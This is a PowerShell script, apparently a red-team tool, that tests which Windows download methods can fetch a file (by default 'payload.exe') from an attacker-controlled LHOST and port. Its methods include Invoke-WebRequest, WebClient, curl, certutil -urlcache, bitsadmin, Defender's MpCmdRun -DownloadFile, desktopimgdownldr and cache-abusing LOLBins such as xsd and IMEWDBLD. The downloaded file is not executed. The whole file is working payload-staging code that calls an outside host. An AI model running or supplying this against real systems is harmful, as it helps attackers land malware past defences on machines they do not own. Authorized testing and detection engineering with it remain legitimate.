#Requires -Version 5.1
<#
.SYNOPSIS
    Quick Windows download tester.

.DESCRIPTION
    Tries Windows download methods against one URL.

    Default: stops at the first successful download and prints the working
    method, file path, size and SHA-256.

    -All: runs every method, compares the hashes, and writes a detailed log
    and CSV to the destination directory.

    The downloaded file is never executed.

.PARAMETER LHOST
    Server/attacker IP or hostname.

.PARAMETER LPORT
    TCP port (default: 8000).

.PARAMETER FileName
    Remote file name (default: payload.exe).

.PARAMETER Destination
    Local directory (default: C:\Users\Public). Alias: -DIR.
    With -NoLogs and no -DIR, the current directory is used.

.PARAMETER TimeoutSec
    Timeout for HTTP-based methods, in seconds (default: 20).

.PARAMETER Log
    Write a log and CSV in quick mode. The default quick mode is console-only.
    -All always writes them.

.PARAMETER UNCPath
    Optional UNC source for the UNC-based LOLBins, for example
    \\10.0.2.10\share\payload.exe. Requires an SMB/WebDAV share on LHOST
    (for example: impacket-smbserver share /tmp/share -smb2support).
    Authenticate first with net use for a password-protected share; without
    it the UNC methods fail with Path not found / Cannot open file.
    Without -UNCPath those methods are SKIPped.

.PARAMETER NoLogs
    Quiet quick mode: print only Done! on success, save the file under its
    original name in the current directory (or -DIR), and write no log/CSV.
    -All still runs the full matrix, but writes no log/CSV; downloaded
    test files remain in the destination directory.

.PARAMETER LOLBINS
    Run only safe LOLBin methods (certutil, BITS, bitsadmin, MpCmdRun,
    UNC copy helpers), skipping iwr/irm/WebClient/curl/wget. Danger-tagged
    methods are excluded unless -Danger is also set.

.PARAMETER Danger
    Run only danger-tagged methods: desktopimgdownldr (lockscreen/registry)
    and cache-only downloaders (certutil -URL, CertOC, ConfigSecurityPolicy,
    xsd, IMEWDBLD). They are excluded from -All and -LOLBINS because they
    change system state or write to caches.
    Combine -Danger -LOLBINS to include both sets.

.PARAMETER All
    Run every safe method, write a detailed log and CSV, and compare hashes.
    Danger-tagged methods are excluded unless -Danger is also set.
    Alias: -Full. PowerShell reserves -Debug as a common parameter, so this
    switch is called -All.

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -Log

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -All

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -NoLogs

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -LOLBINS -All

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -Danger -All

.EXAMPLE
    .\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -DIR C:\Users\Public

.NOTES
    Authorized testing only. Does not execute the downloaded file.
    Do not run -Danger on production: it changes lockscreen/registry and cache
    state. Use an isolated, disposable lab host.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string]$LHOST,

    [ValidateRange(1, 65535)]
    [int]$LPORT = 8000,

    [string]$FileName = 'payload.exe',

    [Alias('DIR')]
    [string]$Destination = 'C:\Users\Public',

    [string]$UNCPath = '',

    [ValidateRange(1, 600)]
    [int]$TimeoutSec = 20,

    [switch]$Log,

    [switch]$NoLogs,

    [switch]$LOLBINS,

    [switch]$Danger,

    [Alias('Full')]
    [switch]$All
)

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

if ($NoLogs -and -not $PSBoundParameters.ContainsKey('Destination')) {
    $Destination = (Get-Location).Path
}
$WriteLog = ($All -or $Log) -and (-not $NoLogs)
$Quiet    = $NoLogs -and (-not $All)

$Url         = "http://${LHOST}:${LPORT}/${FileName}"
$Stamp       = Get-Date -Format 'yyyyMMdd-HHmmss'
$Destination = [IO.Path]::GetFullPath($Destination)
$LogPath     = Join-Path $Destination "Windows-download-test-$Stamp.log"
$CsvPath     = Join-Path $Destination "Windows-download-test-$Stamp.csv"
$Results     = New-Object System.Collections.ArrayList

if (-not (Test-Path -LiteralPath $Destination)) {
    New-Item -ItemType Directory -Path $Destination -Force | Out-Null
}

$probe = Join-Path $Destination ".ft-write-test-$Stamp"
try {
    Set-Content -LiteralPath $probe -Value 'ok' -ErrorAction Stop
    Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Cannot write to $Destination : $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

$Leaf = [IO.Path]::GetFileNameWithoutExtension($FileName)
if (-not $Leaf) { $Leaf = 'payload' }
$Ext = [IO.Path]::GetExtension($FileName)
if (-not $Ext) { $Ext = '.bin' }

function Write-TestLog {
    param(
        [string]$Message,
        [switch]$NoConsole
    )

    $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Message
    if (-not $NoConsole) {
        Write-Host $line
    }
    if ($WriteLog) {
        Add-Content -LiteralPath $LogPath -Value $line -Encoding UTF8
    }
}

function New-TestResult {
    param(
        [string]$Method,
        [string]$Status,
        [string]$Path,
        $Bytes,
        [string]$Hash,
        [double]$Seconds,
        [string]$Error
    )

    [pscustomobject]@{
        Method  = $Method
        Status  = $Status
        File    = $Path
        Bytes   = $Bytes
        SHA256  = $Hash
        Seconds = [math]::Round($Seconds, 2)
        Error   = $Error
    }
}

function Invoke-DownloadMethod {
    param(
        [string]$Name,
        [scriptblock]$Action
    )

    $safe = ($Name -replace '[^a-zA-Z0-9-]', '-').ToLower()
    if ($Quiet) {
        $out = Join-Path $Destination ([IO.Path]::GetFileName($FileName))
    } else {
        $out = Join-Path $Destination ("$Leaf-$safe$Ext")
    }

    if (Test-Path -LiteralPath $out) {
        Remove-Item -LiteralPath $out -Force -ErrorAction SilentlyContinue
    }

    $sw  = [System.Diagnostics.Stopwatch]::StartNew()
    $err = $null
    try {
        & $Action $out
    } catch {
        $err = $_.Exception.Message
    }
    $sw.Stop()
    Start-Sleep -Milliseconds 300

    if ($err) {
        $size = $null
        if (Test-Path -LiteralPath $out) {
            $size = (Get-Item -LiteralPath $out).Length
        }
        $result = New-TestResult -Method $Name -Status 'FAIL' -Path $out -Bytes $size -Hash '' -Seconds $sw.Elapsed.TotalSeconds -Error ($err -replace '\s+', ' ')
    }
    elseif (Test-Path -LiteralPath $out) {
        $item = Get-Item -LiteralPath $out
        if ($item.Length -gt 0) {
            $hash = (Get-FileHash -Path $out -Algorithm SHA256).Hash
            $result = New-TestResult -Method $Name -Status 'OK' -Path $out -Bytes $item.Length -Hash $hash -Seconds $sw.Elapsed.TotalSeconds -Error ''
        } else {
            $result = New-TestResult -Method $Name -Status 'FAIL' -Path $out -Bytes 0 -Hash '' -Seconds $sw.Elapsed.TotalSeconds -Error 'file is empty'
        }
    }
    else {
        $result = New-TestResult -Method $Name -Status 'FAIL' -Path $out -Bytes $null -Hash '' -Seconds $sw.Elapsed.TotalSeconds -Error 'file not created'
    }

    # In quick mode, do not leave failed partial files behind
    if (-not $All -and $result.Status -ne 'OK' -and (Test-Path -LiteralPath $out)) {
        Remove-Item -LiteralPath $out -Force -ErrorAction SilentlyContinue
    }

    $color = switch ($result.Status) {
        'OK'   { 'Green' }
        'FAIL' { 'Red' }
        default { 'Yellow' }
    }
    $sizeText = if ($null -eq $result.Bytes) { '-' } else { [string]$result.Bytes }
    if (-not $Quiet) {
        Write-Host ('[{0}] {1,-18} {2,10} B {3,7:N2}s  {4}' -f $result.Status, $result.Method, $sizeText, $result.Seconds, $result.Error) -ForegroundColor $color
    }

    if ($WriteLog) {
        Add-Content -LiteralPath $LogPath -Value ('[{0}] {1,-18} {2,10} B {3,7:N2}s  {4}' -f $result.Status, $result.Method, $sizeText, $result.Seconds, $result.Error) -Encoding UTF8
    }

    [void]$Results.Add($result)
    return $result
}

# Locate MpCmdRun.exe (Defender platform folder, then Program Files)
$MpCmdRun = $null
if ($env:ProgramData) {
    $platform = Join-Path $env:ProgramData 'Microsoft\Windows Defender\Platform'
    if (Test-Path -LiteralPath $platform) {
        $MpCmdRun = Get-ChildItem -LiteralPath $platform -Filter 'MpCmdRun.exe' -Recurse -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $MpCmdRun) {
        $candidates = @()
        if ($env:ProgramFiles) { $candidates += (Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe') }
        $pf86 = ${env:ProgramFiles(x86)}
        if ($pf86) { $candidates += (Join-Path $pf86 'Windows Defender\MpCmdRun.exe') }
        foreach ($candidate in $candidates) {
            if (Test-Path -LiteralPath $candidate) { $MpCmdRun = $candidate; break }
        }
    }
}

$ConfigSecurityPolicy = $null
if ($env:ProgramData) {
    $defenderPlatform = Join-Path $env:ProgramData 'Microsoft\Windows Defender\Platform'
    if (Test-Path -LiteralPath $defenderPlatform) {
        $ConfigSecurityPolicy = Get-ChildItem -LiteralPath $defenderPlatform -Filter 'ConfigSecurityPolicy.exe' -Recurse -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $ConfigSecurityPolicy) {
        $cspCandidates = @()
        if ($env:ProgramFiles) { $cspCandidates += (Join-Path $env:ProgramFiles 'Windows Defender\ConfigSecurityPolicy.exe') }
        $pf86csp = ${env:ProgramFiles(x86)}
        if ($pf86csp) { $cspCandidates += (Join-Path $pf86csp 'Windows Defender\ConfigSecurityPolicy.exe') }
        foreach ($candidate in $cspCandidates) {
            if (Test-Path -LiteralPath $candidate) { $ConfigSecurityPolicy = $candidate; break }
        }
    }
}

$InetCache = $null
$CryptCache = $null
if ($env:LOCALAPPDATA) {
    $InetCache  = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\INetCache'
    $CryptCache = Join-Path $env:LOCALAPPDATA 'Microsoft\CryptnetUrlCache\Content'
}
$CacheUrl = "${Url}?ft=$Stamp"
$IMEWDBLD = $null
if ($env:SystemRoot) { $IMEWDBLD = Join-Path $env:SystemRoot 'System32\IME\SHARED\IMEWDBLD.exe' }

$MpCmdRunDownload = $false
if ($MpCmdRun) {
    try {
        $mpHelp = & $MpCmdRun -? 2>&1 | Out-String
        $MpCmdRunDownload = [bool]($mpHelp -match '(?i)[-/]DownloadFile')
    } catch {
        $MpCmdRunDownload = $false
    }
}

function Invoke-CacheCapture {
    param(
        [string]$CacheRoot,
        [scriptblock]$Action,
        [string]$Out
    )

    if (-not $CacheRoot) { throw 'cache directory is not available' }
    if (-not (Test-Path -LiteralPath $CacheRoot)) {
        New-Item -ItemType Directory -Path $CacheRoot -Force | Out-Null
    }

    $before = @{}
    Get-ChildItem -LiteralPath $CacheRoot -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object { $before[$_.FullName] = $_.LastWriteTimeUtc.Ticks }

    & $Action
    Start-Sleep -Milliseconds 500

    $new = Get-ChildItem -LiteralPath $CacheRoot -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { -not $before.ContainsKey($_.FullName) -or $before[$_.FullName] -ne $_.LastWriteTimeUtc.Ticks } |
        Sort-Object LastWriteTimeUtc -Descending |
        Select-Object -First 1

    if (-not $new) { throw "no new cache file in $CacheRoot" }
    if ($new.FullName -ne $Out) { Move-Item -LiteralPath $new.FullName -Destination $Out -Force }
}

$Methods = @(
    [pscustomobject]@{
        Name      = 'iwr'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            param($out)
            $p = @{ Uri = $Url; OutFile = $out; TimeoutSec = $TimeoutSec; ErrorAction = 'Stop' }
            if ($PSVersionTable.PSVersion.Major -lt 6) { $p['UseBasicParsing'] = $true }
            Invoke-WebRequest @p | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'irm'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            param($out)
            Invoke-RestMethod -Uri $Url -OutFile $out -TimeoutSec $TimeoutSec -ErrorAction Stop
        }
    },
    [pscustomobject]@{
        Name      = 'webclient'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            param($out)
            (New-Object Net.WebClient).DownloadFile($Url, $out)
        }
    },
    [pscustomobject]@{
        Name      = 'webclient-proxy'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            param($out)
            $wc = New-Object Net.WebClient
            $wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
            $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
            $wc.DownloadFile($Url, $out)
        }
    },
    [pscustomobject]@{
        Name      = 'webrequest'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            param($out)
            $req = [Net.WebRequest]::Create($Url)
            $req.Timeout = $TimeoutSec * 1000
            $resp = $req.GetResponse()
            try {
                $rs = $resp.GetResponseStream()
                $fs = [IO.File]::Create($out)
                try { $rs.CopyTo($fs) } finally { $fs.Close(); $rs.Close() }
            } finally { $resp.Close() }
        }
    },
    [pscustomobject]@{
        Name      = 'httpclient'
        Tag       = 'Standard'
        Available = {
            try { Add-Type -AssemblyName System.Net.Http -ErrorAction Stop; $true } catch { $false }
        }
        Run       = {
            param($out)
            Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
            $client = New-Object Net.Http.HttpClient
            try {
                $client.Timeout = [TimeSpan]::FromSeconds($TimeoutSec)
                $bytes = $client.GetByteArrayAsync($Url).GetAwaiter().GetResult()
                [IO.File]::WriteAllBytes($out, $bytes)
            } finally { $client.Dispose() }
        }
    },
    [pscustomobject]@{
        Name      = 'curl'
        Tag       = 'Standard'
        Available = { [bool](Get-Command curl.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $output = & curl.exe -sS -f -o $out $Url 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'certutil'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command certutil.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $output = & certutil.exe -urlcache -split -f $Url $out 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'bits-normal'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            Start-BitsTransfer -Source $Url -Destination $out -DisplayName "ft-$Stamp-bits-normal" -ErrorAction Stop | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'bits-dynamic'
        Tag       = 'LOLBIN'
        Available = {
            $c = Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue
            [bool]($c -and $c.Parameters.ContainsKey('Dynamic'))
        }
        Run       = {
            param($out)
            Start-BitsTransfer -Dynamic -Source $Url -Destination $out -DisplayName "ft-$Stamp-bits-dynamic" -ErrorAction Stop | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'bitsadmin-normal'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command bitsadmin.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $job = "ft-$Stamp-bitsadmin-normal"
            $output = & bitsadmin.exe /transfer $job /download /priority high $Url $out 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0 -or $output -match '(?i)0x[0-9a-f]{8}') {
                & bitsadmin.exe /cancel $job 2>&1 | Out-Null
                throw ($output.Trim())
            }
        }
    },
    [pscustomobject]@{
        Name      = 'bitsadmin-dynamic'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command bitsadmin.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $job = "ft-$Stamp-bitsadmin-dynamic"
            $output = & bitsadmin.exe /transfer $job /download /priority high /dynamic $Url $out 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0 -or $output -match '(?i)0x[0-9a-f]{8}') {
                & bitsadmin.exe /cancel $job 2>&1 | Out-Null
                throw ($output.Trim())
            }
        }
    },
    [pscustomobject]@{
        Name      = 'mpcmdrun'
        Tag       = 'LOLBIN'
        Available = { $MpCmdRunDownload }
        Run       = {
            param($out)
            $output = & $MpCmdRun -DownloadFile -url $Url -path $out 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'desktopimgdownldr'
        Tag       = 'Danger'
        Available = { [bool](Get-Command desktopimgdownldr.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $root = Join-Path $Destination ("dldr-" + [Guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $root -Force | Out-Null
            $oldSystemRoot = $env:SYSTEMROOT
            try {
                $env:SYSTEMROOT = $root
                $output = & desktopimgdownldr.exe /lockscreenurl:$Url /eventName:"ft-$Stamp" 2>&1 | Out-String
                $file = Get-ChildItem -LiteralPath $root -Recurse -File -ErrorAction SilentlyContinue |
                    Sort-Object LastWriteTime -Descending |
                    Select-Object -First 1
                if (-not $file) { throw ('desktopimgdownldr did not create a file: ' + $output.Trim()) }
                if ($file.FullName -ne $out) { Move-Item -LiteralPath $file.FullName -Destination $out -Force }
            } finally {
                $env:SYSTEMROOT = $oldSystemRoot
                Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    },
    [pscustomobject]@{
        Name      = 'certutil-url'
        Tag       = 'Danger'
        Available = { [bool](Get-Command certutil.exe -ErrorAction SilentlyContinue) -and [bool]$CryptCache }
        Run       = {
            param($out)
            Invoke-CacheCapture -CacheRoot $CryptCache -Out $out -Action {
                & certutil.exe -URL $CacheUrl 2>&1 | Out-Null
            }
        }
    },
    [pscustomobject]@{
        Name      = 'certoc'
        Tag       = 'Danger'
        Available = { [bool](Get-Command certoc.exe -ErrorAction SilentlyContinue) -and [bool]$InetCache }
        Run       = {
            param($out)
            $script:certocStdout = ''
            try {
                Invoke-CacheCapture -CacheRoot $InetCache -Out $out -Action {
                    $script:certocStdout = & certoc.exe -GetCACAPS $CacheUrl 2>&1 | Out-String
                }
            } catch {
                if ($script:certocStdout.Trim().Length -gt 0) {
                    [IO.File]::WriteAllText($out, $script:certocStdout)
                } else {
                    throw
                }
            }
        }
    },
    [pscustomobject]@{
        Name      = 'configsecuritypolicy'
        Tag       = 'Danger'
        Available = { [bool]$ConfigSecurityPolicy -and [bool]$InetCache }
        Run       = {
            param($out)
            Invoke-CacheCapture -CacheRoot $InetCache -Out $out -Action {
                & $ConfigSecurityPolicy $CacheUrl 2>&1 | Out-Null
            }
        }
    },
    [pscustomobject]@{
        Name      = 'xsd'
        Tag       = 'Danger'
        Available = { [bool](Get-Command xsd.exe -ErrorAction SilentlyContinue) -and [bool]$InetCache }
        Run       = {
            param($out)
            Invoke-CacheCapture -CacheRoot $InetCache -Out $out -Action {
                & xsd.exe $CacheUrl 2>&1 | Out-Null
            }
        }
    },
    [pscustomobject]@{
        Name      = 'imewdbld'
        Tag       = 'Danger'
        Available = { [bool]$IMEWDBLD -and (Test-Path -LiteralPath $IMEWDBLD) -and [bool]$InetCache }
        Run       = {
            param($out)
            Invoke-CacheCapture -CacheRoot $InetCache -Out $out -Action {
                & $IMEWDBLD $CacheUrl 2>&1 | Out-Null
            }
        }
    },
    [pscustomobject]@{
        Name      = 'esentutl-unc'
        Tag       = 'LOLBIN'
        Available = { [bool]$UNCPath -and [bool](Get-Command esentutl.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $output = & esentutl.exe /y $UNCPath /d $out /o 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'extrac32-unc'
        Tag       = 'LOLBIN'
        Available = { [bool]$UNCPath -and [bool](Get-Command extrac32.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $output = & extrac32.exe /Y /C $UNCPath $out 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'replace-unc'
        Tag       = 'LOLBIN'
        Available = { [bool]$UNCPath -and [bool](Get-Command replace.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $dir  = Split-Path -Parent $out
            $leaf = Split-Path -Leaf $UNCPath
            $output = & replace.exe $UNCPath $dir /A 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
            $copied = Join-Path $dir $leaf
            if (-not (Test-Path -LiteralPath $copied)) { throw 'replace did not create the file' }
            if ($copied -ne $out) { Move-Item -LiteralPath $copied -Destination $out -Force }
        }
    },
    [pscustomobject]@{
        Name      = 'wget'
        Tag       = 'Standard'
        Available = { [bool](Get-Command wget.exe -ErrorAction SilentlyContinue) }
        Run       = {
            param($out)
            $output = & wget.exe -q -O $out $Url 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    }
)

if ($All) {
    Write-TestLog '============================================'
    Write-TestLog ' Windows download test'
    Write-TestLog '============================================'
    Write-TestLog "Time:        $(Get-Date -Format o)"
    Write-TestLog "Computer:    $env:COMPUTERNAME"
    Write-TestLog "User:        $env:USERNAME"
    Write-TestLog "PowerShell:  $($PSVersionTable.PSVersion)"
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        Write-TestLog "OS:          $($os.Caption) $($os.Version)"
    } catch {
        Write-TestLog "OS:          $([Environment]::OSVersion.VersionString)"
    }
    Write-TestLog "URL:         $Url"
    Write-TestLog "Destination: $Destination"
    if ($Danger) { Write-TestLog 'Mode:        DANGER (danger-tagged methods enabled)' }
    if ($UNCPath) {
        try {
            $uncOk = Test-Path -LiteralPath $UNCPath
            Write-TestLog "UNC:         $UNCPath (accessible: $uncOk; run net use first if false)"
        } catch {
            Write-TestLog "UNC:         $UNCPath (access check failed - run net use first?)"
        }
    }
    try {
        $bitsSvc = Get-Service BITS -ErrorAction Stop
        Write-TestLog "BITS:        $($bitsSvc.Status)"
    } catch {
        Write-TestLog 'BITS:        service not found'
    }
    try {
        $proxy = [Net.WebRequest]::GetSystemWebProxy().GetProxy([Uri]$Url)
        Write-TestLog "Proxy:       $proxy"
    } catch {
        Write-TestLog 'Proxy:       unknown'
    }
    if ($MpCmdRun) {
        Write-TestLog "MpCmdRun:    $MpCmdRun (DownloadFile: $MpCmdRunDownload)"
    } else {
        Write-TestLog 'MpCmdRun:    not found'
    }

    try {
        $headParams = @{ Uri = $Url; Method = 'Head'; TimeoutSec = $TimeoutSec; ErrorAction = 'Stop' }
        if ($PSVersionTable.PSVersion.Major -lt 6) { $headParams['UseBasicParsing'] = $true }
        $head = Invoke-WebRequest @headParams
        Write-TestLog "HTTP status: $($head.StatusCode)"
        Write-TestLog "Server:      $($head.Headers['Server'])"
        Write-TestLog "Accept-Ranges: $($head.Headers['Accept-Ranges'])"
        Write-TestLog "Content-Length: $($head.Headers['Content-Length'])"
    } catch {
        Write-TestLog "HEAD failed: $($_.Exception.Message)"
    }

    try {
        $rangeReq = [Net.HttpWebRequest]::Create($Url)
        $rangeReq.Method = 'GET'
        $rangeReq.Timeout = $TimeoutSec * 1000
        $rangeReq.AddRange(0, 9)
        $rangeResp = $rangeReq.GetResponse()
        try {
            $rangeStatus = [int]$rangeResp.StatusCode
            $contentRange = $rangeResp.Headers['Content-Range']
            $acceptRanges = $rangeResp.Headers['Accept-Ranges']
        } finally {
            $rangeResp.Close()
        }
        Write-TestLog "Range probe: $rangeStatus  Content-Range: $contentRange  Accept-Ranges: $acceptRanges"
    } catch {
        Write-TestLog "Range probe: FAILED - $($_.Exception.Message)"
    }
    Write-TestLog ''
}
else {
    if (-not $Quiet) {
        Write-Host "Testing $Url -> $Destination" -ForegroundColor Cyan
        Write-Host 'Stop at first success. Use -Log for a log or -All for the full matrix.' -ForegroundColor DarkGray
        Write-Host ''
    }
    if ($WriteLog) {
        Write-TestLog 'Windows download test' -NoConsole
        Write-TestLog "Time:        $(Get-Date -Format o)" -NoConsole
        Write-TestLog "URL:         $Url" -NoConsole
        Write-TestLog "Destination: $Destination" -NoConsole
        Write-TestLog '' -NoConsole
    }
}

$AllowedTags = @('Standard', 'LOLBIN')
if ($Danger -or $LOLBINS) {
    $AllowedTags = @()
    if ($Danger) { $AllowedTags += 'Danger' }
    if ($LOLBINS) { $AllowedTags += 'LOLBIN' }
}

$firstSuccess = $null
foreach ($method in $Methods) {
    if ($method.Tag -notin $AllowedTags) { continue }

    if (-not (& $method.Available)) {
        $skip = New-TestResult -Method $method.Name -Status 'SKIP' -Path '' -Bytes $null -Hash '' -Seconds 0 -Error 'not available'
        [void]$Results.Add($skip)
        Write-Host ('[SKIP] {0}' -f $method.Name) -ForegroundColor Yellow
        if ($WriteLog) {
            Add-Content -LiteralPath $LogPath -Value ('[SKIP] {0}' -f $method.Name) -Encoding UTF8
        }
        continue
    }

    $result = Invoke-DownloadMethod -Name $method.Name -Action $method.Run
    if ($result.Status -eq 'OK') {
        if (-not $firstSuccess) { $firstSuccess = $result }
        if (-not $All) { break }
    }
}

if ($All) {
    if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
        Get-BitsTransfer -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -like "ft-$Stamp-*" } |
            Remove-BitsTransfer -Confirm:$false -ErrorAction SilentlyContinue
    }

    Write-TestLog ''
    Write-TestLog '============================================'
    Write-TestLog ' Summary'
    Write-TestLog '============================================'
    $summary = $Results | Format-Table -AutoSize | Out-String -Width 300
    Write-Host $summary
    if ($WriteLog) {
        Add-Content -LiteralPath $LogPath -Value $summary -Encoding UTF8
        $Results | Export-Csv -Path $CsvPath -NoTypeInformation -Encoding UTF8
    }

    $okHashes = @($Results | Where-Object { $_.Status -eq 'OK' } | Select-Object -ExpandProperty SHA256 -Unique)
    if ($okHashes.Count -eq 1) {
        Write-TestLog "All successful downloads have the same SHA256: $($okHashes[0])"
    } elseif ($okHashes.Count -gt 1) {
        Write-TestLog "WARNING: successful downloads have different hashes: $($okHashes -join ', ')"
    } else {
        Write-TestLog 'WARNING: no successful downloads'
    }
    if ($WriteLog) {
        Write-TestLog "Log saved: $LogPath"
        Write-TestLog "CSV saved: $CsvPath"
    }
}
else {
    if ($firstSuccess) {
        $finalLine = '[OK] {0}: {1} ({2} bytes, {3:N2}s)' -f $firstSuccess.Method, $firstSuccess.File, $firstSuccess.Bytes, $firstSuccess.Seconds
        if ($Quiet) {
            Write-Host 'Done!' -ForegroundColor Green
        } else {
            Write-Host ''
            Write-Host $finalLine -ForegroundColor Green
            Write-Host ('     SHA256: {0}' -f $firstSuccess.SHA256)
            Write-Host '     Use -Log for a log or -All for the full matrix.' -ForegroundColor DarkGray
        }
        if ($WriteLog) {
            Write-TestLog $finalLine -NoConsole
            Write-TestLog ('SHA256: {0}' -f $firstSuccess.SHA256) -NoConsole
        }
    }
    else {
        if ($Quiet) {
            Write-Host 'Failed.' -ForegroundColor Red
        } else {
            Write-Host ''
            Write-Host 'No download method succeeded.' -ForegroundColor Red
            $Results | Where-Object { $_.Status -ne 'OK' } | Format-Table -AutoSize | Out-String -Width 300 | Write-Host
        }
        if ($WriteLog) {
            Write-TestLog 'No download method succeeded.' -NoConsole
        }
    }

    if ($WriteLog) {
        $Results | Export-Csv -Path $CsvPath -NoTypeInformation -Encoding UTF8
        Write-Host "Log: $LogPath" -ForegroundColor DarkGray
        Write-Host "CSV: $CsvPath" -ForegroundColor DarkGray
        Write-TestLog "Log saved: $LogPath" -NoConsole
        Write-TestLog "CSV saved: $CsvPath" -NoConsole
    }

    if ($firstSuccess) { exit 0 } else { exit 1 }
}

if (@($Results | Where-Object { $_.Status -eq 'OK' }).Count -eq 0) {
    exit 1
}
